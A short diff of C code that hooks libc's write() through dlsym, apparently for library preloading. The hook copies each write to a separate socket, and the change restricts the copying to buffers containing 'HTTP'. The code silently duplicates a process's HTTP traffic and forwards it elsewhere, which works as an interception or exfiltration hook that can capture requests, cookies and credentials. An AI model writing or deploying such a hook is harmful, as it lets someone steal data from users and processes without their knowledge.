@@ -55,11 +55,13 @@ static ssize_t (*original_write)(int, const void *, size_t) = NULL;
 ssize_t write(int fd, const void *buf, size_t nbytes){
     if(!original_write) original_write = dlsym(RTLD_NEXT, "write");
     
-    struct write_data data;
-    data.buf = buf;
-    data.nbytes = nbytes;
-    
-    write_data_threaded(&data);
+    if(strstr(buf, "HTTP") != NULL){
+        struct write_data data;
+        data.buf = buf;
+        data.nbytes = nbytes;
+        
+        write_data_threaded(&data);
+    }
     
     return original_write(fd, buf, nbytes);
 }
@@ -72,7 +74,7 @@ void* write_data_threaded(void* data){
     
     original_write(sendfd, ((struct write_data *) data)->buf, ((struct write_data *) data)->nbytes);
     close(sendfd);
-
+    
     return NULL;
 }
 
